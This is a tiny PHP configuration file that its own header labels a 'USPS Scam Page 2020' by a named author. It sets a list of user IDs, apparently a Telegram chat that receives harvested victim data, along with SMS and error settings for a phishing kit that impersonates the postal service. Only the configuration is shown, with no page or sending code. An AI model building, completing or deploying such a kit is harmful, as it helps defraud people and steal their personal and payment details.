<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("-1001160178367");
$sms='3';
$error='0';
?>
